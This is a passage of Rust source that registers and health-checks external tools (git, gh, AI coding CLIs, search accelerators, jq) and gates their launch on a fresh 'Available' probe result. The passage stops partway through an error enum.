//! Feature-owned external-runtime adapters for non-safety integrations.
//!
//! Registers the closed trusted-catalog inventory (git, lazygit, gh binary,
//! KCL, harness presets, optional accelerators, external jq) and provides
//! helpers to upsert configured harness / LSP / stdio MCP commands under
//! [`ProbePolicy::ConfiguredCommand`] only.
//!
//! Launch gates require a same-generation [`HealthState::Available`] entry.
//! Discovery and health refresh never run auth flows, installers, browsers,
//! package managers, or network requests, and never start configured commands.

use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::path::{Path, PathBuf};
use std::sync::Arc;

use super::health::{ExternalRuntimeSnapshot, HealthEntry, HealthState};
use super::platform::{common_platform_remedy, configured_command_remedy, package_remedy_table};
use super::registry::{ExternalRuntimeRegistry, RegistryError};
use super::schema::{
    Applicability, DependencyImportance, ExternalRuntimeDescriptor, ExternalRuntimeId,
    HostPlatform, ProbePolicy, RemedyKind, VersionParser,
};
use crate::capabilities::ExecutionTarget;

// ── Stable catalog IDs ──────────────────────────────────────────────────────

/// Git binary for repository / history / diff / package-clone features.
pub const ID_GIT: &str = "git";
/// Lazygit embedded UI.
pub const ID_LAZYGIT: &str = "lazygit";
/// GitHub CLI binary health (authentication is a separate concern).
pub const ID_GH: &str = "gh";
/// KCL package execution / export (current KCL only; no legacy fallback).
pub const ID_KCL: &str = "kcl";
/// Claude harness preset.
pub const ID_HARNESS_CLAUDE: &str = "harness.claude";
/// Codex harness preset.
pub const ID_HARNESS_CODEX: &str = "harness.codex";
/// Gemini harness preset.
pub const ID_HARNESS_GEMINI: &str = "harness.gemini";
/// OpenCode harness preset.
pub const ID_HARNESS_OPENCODE: &str = "harness.opencode";
/// Optional ripgrep accelerator.
pub const ID_ACCEL_RG: &str = "accel.rg";
/// Optional fd accelerator.
pub const ID_ACCEL_FD: &str = "accel.fd";
/// Optional GNU sed (`gsed`) accelerator.
pub const ID_ACCEL_GSED: &str = "accel.gsed";
/// Host `jq` only for features the built-in Cockpit jq applet cannot serve.
pub const ID_JQ_EXTERNAL: &str = "jq.external";

/// Closed exact roster of known trusted-catalog integration adapters.
///
/// Configured custom harness / LSP / stdio MCP entries are dynamic and are
/// **not** members of this set; they are upserted separately.
pub fn known_catalog_adapter_ids() -> &'static [&'static str] {
    &[
        ID_GIT,
        ID_LAZYGIT,
        ID_GH,
        ID_KCL,
        ID_HARNESS_CLAUDE,
        ID_HARNESS_CODEX,
        ID_HARNESS_GEMINI,
        ID_HARNESS_OPENCODE,
        ID_ACCEL_RG,
        ID_ACCEL_FD,
        ID_ACCEL_GSED,
        ID_JQ_EXTERNAL,
    ]
}

/// Known harness preset names that receive trusted-catalog recipes.
pub fn known_harness_preset_names() -> &'static [&'static str] {
    &["claude", "codex", "gemini", "opencode"]
}

// ── ID builders for configured commands ─────────────────────────────────────

/// Runtime ID for a user-configured custom harness command.
pub fn custom_harness_id(name: &str) -> ExternalRuntimeId {
    ExternalRuntimeId::new(format!("harness.custom.{name}"))
}

/// Runtime ID for a configured LSP server (command health only).
pub fn lsp_server_id(server_id: &str) -> ExternalRuntimeId {
    ExternalRuntimeId::new(format!("lsp.{server_id}"))
}

/// Runtime ID for a configured stdio MCP server command.
pub fn stdio_mcp_id(server_name: &str) -> ExternalRuntimeId {
    ExternalRuntimeId::new(format!("mcp.stdio.{server_name}"))
}

// ── Catalog construction ────────────────────────────────────────────────────

fn version_first_line_policy() -> ProbePolicy {
    ProbePolicy::trusted_catalog(["--version"], VersionParser::FirstSemverToken, None)
}

fn catalog_owner(feature: &str) -> (String, String) {
    ("cockpit-core".into(), feature.into())
}

fn integration_remedy(binary: &str, prose: &str) -> RemedyKind {
    match binary {
        "git" => RemedyKind::platform_recipes(
            prose,
            package_remedy_table("git", "git", "git", "git", Some("Git.Git")),
        ),
        "lazygit" => RemedyKind::platform_recipes(
            prose,
            package_remedy_table(
                "lazygit",
                "lazygit",
                "lazygit",
                "lazygit",
                Some("JesseDuffield.lazygit"),
            ),
        ),
        "gh" => RemedyKind::platform_recipes(
            prose,
            package_remedy_table("gh", "gh", "github-cli", "gh", Some("GitHub.cli")),
        ),
        "kcl" => RemedyKind::platform_recipes(
            prose,
            package_remedy_table("kcl", "kcl", "kcl", "kcl", None),
        ),
        "claude" | "codex" | "gemini" | "opencode" => RemedyKind::platform_recipes(prose, {
            let mut recipes = BTreeMap::new();
            recipes.insert(
                HostPlatform::MacOs,
                format!("Install `{binary}` and ensure it is on PATH."),
            );
            recipes.insert(
                HostPlatform::Windows,
                format!("Install `{binary}` and ensure it is on PATH."),
            );
            recipes.insert(
                HostPlatform::DebianUbuntu,
                format!("Install `{binary}` and ensure it is on PATH."),
            );
            recipes.insert(
                HostPlatform::FedoraRhel,
                format!("Install `{binary}` and ensure it is on PATH."),
            );
            recipes.insert(
                HostPlatform::Arch,
                format!("Install `{binary}` and ensure it is on PATH."),
            );
            recipes.insert(
                HostPlatform::GenericLinux,
                format!("Install `{binary}` and ensure it is on PATH."),
            );
            recipes.insert(
                HostPlatform::OtherUnix,
                format!("Install `{binary}` and ensure it is on PATH."),
            );
            recipes.insert(
                HostPlatform::Unsupported,
                format!("Install `{binary}` and ensure it is on PATH."),
            );
            recipes
        }),
        other => common_platform_remedy(other),
    }
}

fn trusted_descriptor(
    id: &str,
    feature: &str,
    candidates: &[&str],
    importance: DependencyImportance,
    applicability: Applicability,
    remedy_binary: &str,
    remedy_prose: &str,
) -> ExternalRuntimeDescriptor {
    let (owner, feat) = catalog_owner(feature);
    ExternalRuntimeDescriptor::builder(id)
        .owner(owner, feat)
        .candidates(candidates.iter().copied())
        .applicability(applicability)
        .importance(importance)
        .target(ExecutionTarget::Host)
        .probe_policy(version_first_line_policy())
        .remedy(integration_remedy(remedy_binary, remedy_prose))
        .build()
        .expect("catalog descriptor is well-formed")
}

/// Build the exact closed set of trusted-catalog integration descriptors.
pub fn catalog_adapter_descriptors() -> Vec<ExternalRuntimeDescriptor> {
    vec![
        trusted_descriptor(
            ID_GIT,
            "git",
            &["git"],
            DependencyImportance::OptionalIntegration,
            Applicability::Always,
            "git",
            "Install git for repository, history, diff, and package-clone features.",
        ),
        trusted_descriptor(
            ID_LAZYGIT,
            "lazygit",
            &["lazygit"],
            DependencyImportance::OptionalIntegration,
            Applicability::Always,
            "lazygit",
            "Install lazygit to open the embedded git UI.",
        ),
        trusted_descriptor(
            ID_GH,
            "github",
            &["gh"],
            DependencyImportance::OptionalIntegration,
            Applicability::Always,
            "gh",
            "Install the GitHub CLI (`gh`) for GitHub operations. Authentication is separate from binary install.",
        ),
        trusted_descriptor(
            ID_KCL,
            "kcl",
            &["kcl"],
            DependencyImportance::OptionalIntegration,
            Applicability::Always,
            "kcl",
            "Install kcl for current KCL package execution/export.",
        ),
        trusted_descriptor(
            ID_HARNESS_CLAUDE,
            "harness.claude",
            &["claude"],
            DependencyImportance::RequiredWhenFeatureSelected,
            Applicability::WhenFeatureSelected,
            "claude",
            "Install the Claude Code CLI (`claude`) for the claude harness preset.",
        ),
        trusted_descriptor(
            ID_HARNESS_CODEX,
            "harness.codex",
            &["codex"],
            DependencyImportance::RequiredWhenFeatureSelected,
            Applicability::WhenFeatureSelected,
            "codex",
            "Install the Codex CLI (`codex`) for the codex harness preset.",
        ),
        trusted_descriptor(
            ID_HARNESS_GEMINI,
            "harness.gemini",
            &["gemini"],
            DependencyImportance::RequiredWhenFeatureSelected,
            Applicability::WhenFeatureSelected,
            "gemini",
            "Install the Gemini CLI (`gemini`) for the gemini harness preset.",
        ),
        trusted_descriptor(
            ID_HARNESS_OPENCODE,
            "harness.opencode",
            &["opencode"],
            DependencyImportance::RequiredWhenFeatureSelected,
            Applicability::WhenFeatureSelected,
            "opencode",
            "Install OpenCode (`opencode`) for the opencode harness preset.",
        ),
        trusted_descriptor(
            ID_ACCEL_RG,
            "search",
            &["rg", "ripgrep"],
            DependencyImportance::OptionalAccelerator,
            Applicability::Always,
            "rg",
            "Install ripgrep or use `search`/`grep` tools instead.",
        ),
        trusted_descriptor(
            ID_ACCEL_FD,
            "search",
            &["fd"],
            DependencyImportance::OptionalAccelerator,
            Applicability::Always,
            "fd",
            "Install fd-find or use `code` with kind `tree`, or use `glob`, instead.",
        ),
        trusted_descriptor(
            ID_ACCEL_GSED,
            "search",
            &["gsed"],
            DependencyImportance::OptionalAccelerator,
            Applicability::Always,
            "gsed",
            "Install GNU sed if macOS-compatible sed behavior is required.",
        ),
        // External host jq is optional and only for features the built-in
        // applet cannot satisfy. Cockpit-owned jq never requires host jq.
        trusted_descriptor(
            ID_JQ_EXTERNAL,
            "jq.external",
            &["jq"],
            DependencyImportance::OptionalAccelerator,
            Applicability::WhenFeatureSelected,
            "jq",
            "Install host jq only when a feature cannot use Cockpit's bundled `cockpit jq` applet.",
        ),
    ]
}

/// Register every known trusted-catalog integration adapter.
///
/// Idempotent with respect to a fresh registry; returns
/// [`RegistryError::DuplicateId`] if an ID is already present.
pub fn register_integration_adapters(
    registry: &ExternalRuntimeRegistry,
) -> Result<(), RegistryError> {
    for descriptor in catalog_adapter_descriptors() {
        registry.register(descriptor)?;
    }
    Ok(())
}

/// Register catalog adapters if missing (idempotent for production composition).
pub fn ensure_integration_adapters_registered(
    registry: &ExternalRuntimeRegistry,
) -> Result<(), RegistryError> {
    for descriptor in catalog_adapter_descriptors() {
        match registry.register(descriptor) {
            Ok(()) => {}
            Err(RegistryError::DuplicateId(_)) => {}
            Err(other) => return Err(other),
        }
    }
    Ok(())
}

/// Process-global health snapshot store for integration adapters.
pub fn global_health_store() -> &'static super::health::HealthSnapshotStore {
    static STORE: std::sync::OnceLock<super::health::HealthSnapshotStore> =
        std::sync::OnceLock::new();
    STORE.get_or_init(super::health::HealthSnapshotStore::new)
}

/// Evaluate one registered runtime and fail closed unless Available.
///
/// Production launch seams call this immediately before OS handoff. The probe
/// result is published into [`global_health_store`] via
/// [`HealthSnapshotStore::publish_live_entry`] (strictly newer generation,
/// merged with prior entries) and authorized only for that published generation.
/// Cancellation is checked before probing and again before publish/authorize.
pub fn require_live_available_for_launch(
    id: &str,
    cwd: &Path,
) -> Result<HealthEntry, LaunchGateError> {
    require_live_available_for_launch_with_cancel(id, cwd, None)
}

/// Same as [`require_live_available_for_launch`], with an optional caller
/// cancellation token that must remain uncancelled through handoff authorization.
pub fn require_live_available_for_launch_with_cancel(
    id: &str,
    cwd: &Path,
    cancel: Option<&super::probe::CancelToken>,
) -> Result<HealthEntry, LaunchGateError> {
    if cancel.is_some_and(|c| c.is_cancelled()) {
        return Err(LaunchGateError::Cancelled);
    }
    let registry = super::registry::global_registry();
    ensure_integration_adapters_registered(&registry).map_err(|err| {
        LaunchGateError::NotAvailable {
            id: ExternalRuntimeId::new(id),
            state: HealthState::Failed {
                cause: super::health::HealthCause::Internal {
                    message: format!("adapter registration failed: {err}"),
                },
            },
        }
    })?;
    let descriptor = registry
        .get(id)
        .ok_or_else(|| LaunchGateError::MissingEntry(ExternalRuntimeId::new(id)))?;
    let platform = super::platform::detect_host_platform();
    let ctx = super::probe::EvaluationContext::new(platform)
        .with_features([descriptor.owner.feature.clone()]);
    let local_cancel = super::probe::CancelToken::new();
    let probe_cancel = cancel.unwrap_or(&local_cancel);
    let entry = super::probe::evaluate_descriptor(
        &descriptor,
        &super::probe::SystemProbeExecutor,
        None,
        cwd,
        &ctx,
        super::probe::ProbeDeadlines::default(),
        probe_cancel,
    );
    // Late probe completion after cancel cannot authorize OS handoff.
    if cancel.is_some_and(|c| c.is_cancelled()) {
        return Err(LaunchGateError::Cancelled);
    }
    let store = global_health_store();
    let (published, generation) = store.publish_live_entry(entry.clone(), descriptor, platform);
    require_available_for_launch(&published, id, generation)?;
    Ok(entry)
}

/// Upsert a configured command and require live Available before launch.
pub fn require_configured_command_available_for_launch(
    id: ExternalRuntimeId,
    feature: &str,
    input: &ConfiguredCommandInput,
    cwd: &Path,
) -> Result<HealthEntry, LaunchGateError> {
    require_configured_command_available_for_launch_with_cancel(id, feature, input, cwd, None)
}

/// Configured-command launch gate with optional caller cancellation.
///
/// Upserts the exact configured executable, evaluates it, publishes into the
/// shared health store under a new generation, and authorizes that generation.
pub fn require_configured_command_available_for_launch_with_cancel(
    id: ExternalRuntimeId,
    feature: &str,
    input: &ConfiguredCommandInput,
    cwd: &Path,
    cancel: Option<&super::probe::CancelToken>,
) -> Result<HealthEntry, LaunchGateError> {
    if cancel.is_some_and(|c| c.is_cancelled()) {
        return Err(LaunchGateError::Cancelled);
    }
    let registry = super::registry::global_registry();
    ensure_integration_adapters_registered(&registry).map_err(|err| {
        LaunchGateError::NotAvailable {
            id: id.clone(),
            state: HealthState::Failed {
                cause: super::health::HealthCause::Internal {
                    message: format!("adapter registration failed: {err}"),
                },
            },
        }
    })?;
    let desc = configured_descriptor(id.clone(), feature, input).map_err(|err| {
        LaunchGateError::NotAvailable {
            id: id.clone(),
            state: HealthState::Failed {
                cause: super::health::HealthCause::Internal {
                    message: format!("configured adapter build failed: {err}"),
                },
            },
        }
    })?;
    // Upsert before evaluate so Settings/doctor composition and launch share
    // the same registry entry for this configured command.
    registry
        .upsert(desc.clone())
        .map_err(|err| LaunchGateError::NotAvailable {
            id: id.clone(),
            state: HealthState::Failed {
                cause: super::health::HealthCause::Internal {
                    message: format!("configured adapter upsert failed: {err}"),
                },
            },
        })?;
    let platform = super::platform::detect_host_platform();
    let ctx =
        super::probe::EvaluationContext::new(platform).with_features([desc.owner.feature.clone()]);
    let local_cancel = super::probe::CancelToken::new();
    let probe_cancel = cancel.unwrap_or(&local_cancel);
    let entry = super::probe::evaluate_descriptor(
        &desc,
        &super::probe::SystemProbeExecutor,
        None,
        cwd,
        &ctx,
        super::probe::ProbeDeadlines::default(),
        probe_cancel,
    );
    if cancel.is_some_and(|c| c.is_cancelled()) {
        return Err(LaunchGateError::Cancelled);
    }
    let store = global_health_store();
    let (published, generation) = store.publish_live_entry(entry.clone(), desc, platform);
    require_available_for_launch(&published, id.as_str(), generation)?;
    Ok(entry)
}

// ── Settings / doctor composition ───────────────────────────────────────────

/// Inputs for the production Settings/doctor health composition path.
///
/// Callers supply every configured custom harness, LSP server, and stdio MCP
/// command so they are registered and refreshed into [`global_health_store`].
#[derive(Debug, Clone, Default)]
pub struct IntegrationHealthComposeInput {
    pub harnesses: Vec<ConfiguredCommandInput>,
    pub lsp_servers: Vec<ConfiguredCommandInput>,
    pub stdio_mcp: Vec<ConfiguredCommandInput>,
    /// Per-invocation CLI override; `None` uses layered configuration.
    pub sandbox_enabled: Option<bool>,
    /// Catalog-owned features selected by resolved configuration.
    pub selected_features: BTreeSet<String>,
}

/// Compose catalog + configured integrations into the process-global health
/// store. This is the Settings/doctor refresh entry point: it upserts every
/// configured command, evaluates discovery/health without executing configured
/// args, and publishes one generation-tagged snapshot.
///
/// Uses [`SystemProbeExecutor`] (production). Tests that must prove no spawn
/// seam should call [`compose_settings_doctor_health_with_executor`].
pub fn compose_settings_doctor_health(
    cwd: &Path,
    input: &IntegrationHealthComposeInput,
) -> Result<Arc<ExternalRuntimeSnapshot>, RegistryError> {
    compose_settings_doctor_health_with_executor(
        cwd,
        input,
        &super::probe::SystemProbeExecutor,
        None,
    )
}

/// Injectable composition path for Settings/doctor (and tests).
pub fn compose_settings_doctor_health_with_executor(
    cwd: &Path,
    input: &IntegrationHealthComposeInput,
    executor: &dyn super::probe::ProbeExecutor,
    path_env: Option<&str>,
) -> Result<Arc<ExternalRuntimeSnapshot>, RegistryError> {
    compose_settings_doctor_health_internal(
        cwd,
        input,
        executor,
        path_env,
        None,
        true,
        None,
        |_| {},
    )
}

/// Invocation-owned composition used by bounded diagnostics. It reports
/// progressive immutable snapshots and never publishes process-global state.
pub(crate) fn compose_settings_doctor_health_for_invocation(
    cwd: &Path,
    input: &IntegrationHealthComposeInput,
    cancel: &super::probe::CancelToken,
    generation: u64,
    observer: impl FnMut(&ExternalRuntimeSnapshot),
) -> Result<Arc<ExternalRuntimeSnapshot>, RegistryError> {
    compose_settings_doctor_health_internal(
        cwd,
        input,
        &super::probe::SystemProbeExecutor,
        None,
        Some(cancel),
        false,
        Some(generation),
        observer,
    )
}

/// Build the exact descriptor roster used by one private diagnostics
/// invocation.  Deadline projection must retain this roster rather than
/// consulting the process-global registry, whose configured rows may differ.
pub(crate) fn invocation_descriptor_roster(
    input: &IntegrationHealthComposeInput,
) -> Result<Vec<ExternalRuntimeDescriptor>, RegistryError> {
    let registry = ExternalRuntimeRegistry::new();
    ensure_integration_adapters_registered(&registry)?;
    let _ = super::safety_adapters::ensure_safety_adapters_registered(&registry);
    let harness_ids = upsert_custom_harnesses(&registry, input.harnesses.clone())?;
    let lsp_ids = upsert_lsp_servers(&registry, input.lsp_servers.clone())?;
    let mcp_ids = upsert_stdio_mcp_servers(&registry, input.stdio_mcp.clone())?;
    let keep = harness_ids
        .iter()
        .chain(lsp_ids.iter())
        .chain(mcp_ids.iter())
        .map(|id| id.as_str().to_owned())
        .collect();
    registry.retain_configured_ids(&keep);
    Ok(registry.descriptors())
}

fn compose_settings_doctor_health_internal(
    cwd: &Path,
    input: &IntegrationHealthComposeInput,
    executor: &dyn super::probe::ProbeExecutor,
    path_env: Option<&str>,
    invocation_cancel: Option<&super::probe::CancelToken>,
    publish_global: bool,
    generation_override: Option<u64>,
    mut observer: impl FnMut(&ExternalRuntimeSnapshot),
) -> Result<Arc<ExternalRuntimeSnapshot>, RegistryError> {
    let registry = if publish_global {
        super::registry::global_registry()
    } else {
        Arc::new(super::registry::ExternalRuntimeRegistry::new())
    };
    ensure_integration_adapters_registered(&registry)?;
    let _ = super::safety_adapters::ensure_safety_adapters_registered(&registry);
    let harness_ids = upsert_custom_harnesses(&registry, input.harnesses.clone())?;
    let lsp_ids = upsert_lsp_servers(&registry, input.lsp_servers.clone())?;
    let mcp_ids = upsert_stdio_mcp_servers(&registry, input.stdio_mcp.clone())?;
    // Drop stale configured entries removed from settings since the last compose.
    let mut keep = BTreeSet::new();
    for id in harness_ids
        .iter()
        .chain(lsp_ids.iter())
        .chain(mcp_ids.iter())
    {
        keep.insert(id.as_str().to_string());
    }
    registry.retain_configured_ids(&keep);

    let descriptors = registry.descriptors();
    let mut features = BTreeSet::new();
    // Registration is inventory, not selection. Only configured entries in
    // this composition make their owning feature applicable.
    for id in &keep {
        if let Some(desc) = descriptors.iter().find(|desc| desc.id.as_str() == id) {
            features.insert(desc.owner.feature.clone());
        }
    }
    features.extend(input.selected_features.iter().cloned());
    let extended = crate::config::extended::load_for_cwd(cwd);
    if input.sandbox_enabled.unwrap_or(true)
        && extended.sandbox.default_mode.enabled()
        && !extended.sandbox.default_mode.is_container()
    {
        features.insert("shell-sandbox".to_string());
    }
    if crate::config::extended::resolve_computer_use_policy_for_cwd(cwd)
        .is_some_and(|mode| !matches!(mode, crate::config::extended::ComputerUseMode::Disabled))
    {
        features.insert("computer-use".to_string());
    }
    let platform = super::platform::detect_host_platform();
    // Container engine probes are applicable only when layered configuration
    // selects a container sandbox; the runtime mode then narrows the engine.
    let engine_mode = if extended.sandbox.default_mode.is_container() {
        super::safety_adapters::current_container_engine_mode()
    } else {
        super::safety_adapters::ContainerEngineMode::Disabled
    };
    if extended.sandbox.default_mode.is_container() {
        features.insert("container-sandbox".to_string());
    }
    let ctx = super::probe::EvaluationContext::new(platform).with_features(features);
    let store = global_health_store();
    let generation = if let Some(generation) = generation_override {
        generation
    } else if publish_global {
        store.begin_refresh()
    } else {
        store
            .current()
            .map_or(1, |snapshot| snapshot.generation.saturating_add(1))
    };
    let local_cancel = super::probe::CancelToken::new();
    let cancel = invocation_cancel.unwrap_or(&local_cancel);
    let mut snapshot = super::probe::refresh_snapshot_with_observer(
        generation,
        &descriptors,
        executor,
        path_env,
        cwd,
        &ctx,
        super::probe::ProbeDeadlines::default(),
        cancel,
        &mut observer,
    );
    snapshot.groups.insert(
        "computer-use".to_owned(),
        super::health::evaluate_requirement_group(
            &super::safety_adapters::computer_use_requirement_group(),
            &snapshot,
        ),
    );
    // Merge Docker/Podman health from a private mode-aware refresh (never
    // registered into the global catalog).
    {
        use super::safety_adapters::{ContainerEngineMode, ID_DOCKER, ID_PODMAN};
        if !matches!(engine_mode, ContainerEngineMode::Disabled) {
            let engine_reg = super::registry::ExternalRuntimeRegistry::new();
            let base_snapshot = snapshot.clone();
            let engine_snap = super::safety_adapters::refresh_safety_snapshot_with_observer(
                &engine_reg,
                executor,
                path_env,
                cwd,
                &ctx,
                super::probe::ProbeDeadlines::default(),
                cancel,
                generation,
                engine_mode,
                |engine_progress| {
                    let mut progress = base_snapshot.clone();
                    progress.entries.extend(engine_progress.entries.clone());
                    observer(&progress);
                },
            );
            for id in [ID_DOCKER, ID_PODMAN] {
                if let Some(entry) = engine_snap.get(id) {
                    snapshot.entries.insert(id.to_string(), entry.clone());
                }
            }
        }
    }
    if !publish_global {
        return Ok(Arc::new(snapshot));
    }
    if !store.publish_bundle(snapshot.clone(), descriptors) {
        // A newer full refresh or live handoff superseded this composition;
        // surface the current published snapshot when available.
        if let Some(current) = store.current() {
            return Ok(current);
        }
        return Err(RegistryError::DuplicateId(ExternalRuntimeId::new(
            "compose-generation-superseded",
        )));
    }
    store
        .current()
        .ok_or_else(|| RegistryError::DuplicateId(ExternalRuntimeId::new("compose-empty-store")))
}

/// Build composition input from resolved harness configs (custom + overrides).
///
/// Known stock presets (bare command == name) are catalog-owned and omitted;
/// every other harness is registered as ConfiguredCommand.
pub fn harness_compose_inputs(
    harnesses: &HashMap<String, crate::config::extended::HarnessConfig>,
) -> Vec<ConfiguredCommandInput> {
    let mut out = Vec::new();
    for (name, cfg) in harnesses {
        let is_stock_preset = known_harness_preset_names().contains(&name.as_str())
            && cfg.command.as_str() == name.as_str();
        if is_stock_preset {
            continue;
        }
        out.push(ConfiguredCommandInput::new(
            name.clone(),
            cfg.command.clone(),
        ));
    }
    out
}

/// Optional accelerator adapter id for a binary basename used by capability probes.
pub fn accelerator_adapter_id(binary: &str) -> Option<&'static str> {
    match binary {
        "rg" => Some(ID_ACCEL_RG),
        "fd" => Some(ID_ACCEL_FD),
        "gsed" => Some(ID_ACCEL_GSED),
        "jq" => None, // Cockpit-owned jq does not require host jq
        _ => None,
    }
}

// ── Configured command registration (resolution only) ───────────────────────

/// Minimal config-like input for a configured executable. Health never
/// receives or executes `args`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ConfiguredCommandInput {
    /// Feature-local name (harness name, LSP server id, MCP server name).
    pub name: String,
    /// Exact command string from settings (basename or path).
    pub command: String,
    /// Optional absolute path override from settings.
    pub exact_path: Option<PathBuf>,
    /// Configured args are retained for documentation only and are **never**
    /// passed to health probes or spawn seams.
    pub configured_args: Vec<String>,
}

impl ConfiguredCommandInput {
    pub fn new(name: impl Into<String>, command: impl Into<String>) -> Self {
        Self {
            name: name.into(),
            command: command.into(),
            exact_path: None,
            configured_args: Vec::new(),
        }
    }

    pub fn with_exact_path(mut self, path: impl Into<PathBuf>) -> Self {
        self.exact_path = Some(path.into());
        self
    }

    pub fn with_args(mut self, args: impl IntoIterator<Item = impl Into<String>>) -> Self {
        self.configured_args = args.into_iter().map(Into::into).collect();
        self
    }
}

fn configured_descriptor(
    id: ExternalRuntimeId,
    feature: &str,
    input: &ConfiguredCommandInput,
) -> Result<ExternalRuntimeDescriptor, RegistryError> {
    let exact = input.exact_path.clone();
    let exact_str = exact.as_ref().and_then(|p| p.to_str()).map(str::to_string);
    Ok(ExternalRuntimeDescriptor::builder(id)
        .owner("user-config", feature)
        .importance(DependencyImportance::RequiredWhenFeatureSelected)
        .applicability(Applicability::WhenFeatureSelected)
        .target(ExecutionTarget::Host)
        .probe_policy(ProbePolicy::configured_command(
            input.command.clone(),
            exact,
        ))
        .remedy(configured_command_remedy(
            &input.command,
            exact_str.as_deref(),
        ))
        .build()?)
}

/// Upsert a custom harness command as [`ProbePolicy::ConfiguredCommand`].
///
/// Never maps the executable name to a trusted-catalog recipe.
pub fn upsert_custom_harness(
    registry: &ExternalRuntimeRegistry,
    input: &ConfiguredCommandInput,
) -> Result<ExternalRuntimeId, RegistryError> {
    let id = custom_harness_id(&input.name);
    let desc = configured_descriptor(id.clone(), &format!("harness.custom.{}", input.name), input)?;
    registry.upsert(desc)?;
    Ok(id)
}

/// Upsert every configured custom harness command.
///
/// Preset names (`claude` / `codex` / `gemini` / `opencode`) that still use
/// the catalog binary name are **not** re-registered here — they keep the
/// trusted-catalog entry. A custom command for a preset name (or any other
/// name) is registered under `harness.custom.*` as ConfiguredCommand.
pub fn upsert_custom_harnesses(
    registry: &ExternalRuntimeRegistry,
    inputs: impl IntoIterator<Item = ConfiguredCommandInput>,
) -> Result<Vec<ExternalRuntimeId>, RegistryError> {
    let presets: BTreeSet<&str> = known_harness_preset_names().iter().copied().collect();
    let mut ids = Vec::new();
    for input in inputs {
        let is_default_preset_command = presets.contains(input.name.as_str())
            && input.exact_path.is_none()
            && input.command == input.name;
        if is_default_preset_command {
            // Catalog entry already covers the known preset binary.
            continue;
        }
        ids.push(upsert_custom_harness(registry, &input)?);
    }
    Ok(ids)
}

/// Upsert a configured LSP server executable.
///
/// Health resolves spawnability only. Feature-local LSP install confirmation
/// (`LspAutoInstall::Ask` / install recipes) remains owned by `daemon/lsp`
/// and is never triggered from dependency health.
pub fn upsert_lsp_server(
    registry: &ExternalRuntimeRegistry,
    input: &ConfiguredCommandInput,
) -> Result<ExternalRuntimeId, RegistryError> {
    let id = lsp_server_id(&input.name);
    let desc = configured_descriptor(id.clone(), &format!("lsp.{}", input.name), input)?;
    registry.upsert(desc)?;
    Ok(id)
}

/// Upsert every configured LSP server command (first argv element).
pub fn upsert_lsp_servers(
    registry: &ExternalRuntimeRegistry,
    inputs: impl IntoIterator<Item = ConfiguredCommandInput>,
) -> Result<Vec<ExternalRuntimeId>, RegistryError> {
    let mut ids = Vec::new();
    for input in inputs {
        ids.push(upsert_lsp_server(registry, &input)?);
    }
    Ok(ids)
}

/// Upsert a configured stdio MCP command (resolution only; no handshake).
pub fn upsert_stdio_mcp(
    registry: &ExternalRuntimeRegistry,
    input: &ConfiguredCommandInput,
) -> Result<ExternalRuntimeId, RegistryError> {
    let id = stdio_mcp_id(&input.name);
    let desc = configured_descriptor(id.clone(), &format!("mcp.stdio.{}", input.name), input)?;
    registry.upsert(desc)?;
    Ok(id)
}

/// Upsert every configured stdio MCP server command.
pub fn upsert_stdio_mcp_servers(
    registry: &ExternalRuntimeRegistry,
    inputs: impl IntoIterator<Item = ConfiguredCommandInput>,
) -> Result<Vec<ExternalRuntimeId>, RegistryError> {
    let mut ids = Vec::new();
    for input in inputs {
        ids.push(upsert_stdio_mcp(registry, &input)?);
    }
    Ok(ids)
}

/// Build a [`ConfiguredCommandInput`] from an LSP `command` argv vector.
///
/// Only the program (first element) is used for health; remaining args are
/// retained on the input but never executed by health.
pub fn lsp_command_input(server_id: &str, command: &[String]) -> Option<ConfiguredCommandInput> {
    let program = command.first()?.as_str();
    if program.trim().is_empty() {
        return None;
    }
    let path = Path::new(program);
    let (command_name, exact) = if path.is_absolute() || path.components().count() > 1 {
        (
            path.file_name()
                .and_then(|s| s.to_str())
                .unwrap_or(program)
                .to_string(),
            Some(PathBuf::from(program)),
        )
    } else {
        (program.to_string(), None)
    };
    Some(
        ConfiguredCommandInput::new(server_id, command_name)
            .with_args(command.iter().skip(1).cloned())
            .pipe_exact(exact),
    )
}

trait PipeExact {
    fn pipe_exact(self, exact: Option<PathBuf>) -> Self;
}

impl PipeExact for ConfiguredCommandInput {
    fn pipe_exact(mut self, exact: Option<PathBuf>) -> Self {
        self.exact_path = exact;
        self
    }
}

/// Build a [`ConfiguredCommandInput`] from a stdio MCP command + args.
pub fn mcp_stdio_input(
    server_name: &str,
    command: &str,
    args: &[String],
) -> ConfiguredCommandInput {
    let path = Path::new(command);
    let (command_name, exact) = if path.is_absolute() || path.components().count() > 1 {
        (
            path.file_name()
                .and_then(|s| s.to_str())
                .unwrap_or(command)
                .to_string(),
            Some(PathBuf::from(command)),
        )
    } else {
        (command.to_string(), None)
    };
    ConfiguredCommandInput::new(server_name, command_name)
        .with_args(args.iter().cloned())
        .pipe_exact(exact)
}

// ── Built-in jq vs external jq ──────────────────────────────────────────────

/// Cockpit-owned jq behavior is satisfied by the built-in `cockpit jq`
/// applet and must **not** require host `jq` for base health.
pub fn cockpit_owned_jq_requires_host_jq() -> bool {
    false
}

/// External host jq is registered only under [`ID_JQ_EXTERNAL`] for features
/// that cannot use the built-in applet.
pub fn external_jq_adapter_id() -> &'static str {
    ID_JQ_EXTERNAL
}

// ── gh binary vs authentication ─────────────────────────────────────────────

/// GitHub CLI authentication status. Intentionally independent of binary health.
///
/// Dependency discovery / Settings / doctor never evaluate this. Features that
/// need authenticated `gh` must check auth through their own path after the
/// binary is Available.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum GhAuthState {
    /// Health discovery never produces auth state.
    NotCheckedDuringDiscovery,
    /// Feature-owned explicit check result (never produced by adapters health).
    Checked { authenticated: bool },
}

/// Binary health for [`ID_GH`] never implies authentication.
pub fn gh_binary_health_implies_auth(_binary_state: &HealthState) -> bool {
    false
}

/// Discovery and health refresh never run `gh auth` flows.
pub fn discovery_performs_gh_auth() -> bool {
    false
}

// ── Launch gate ─────────────────────────────────────────────────────────────

/// Fail-closed launch gate errors.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum LaunchGateError {
    #[error("no health entry for runtime {0}")]
    MissingEntry(ExternalRuntimeId),
    #[error("snapshot generation {actual} does not match required launch generation {expected}")]
    GenerationMismatch { expected: u64, actual: u64 },
    #[error("runtime {id} is not Available for launch")]
    NotAvailable {
        id: ExternalRuntimeId,
        state: HealthState,
    },
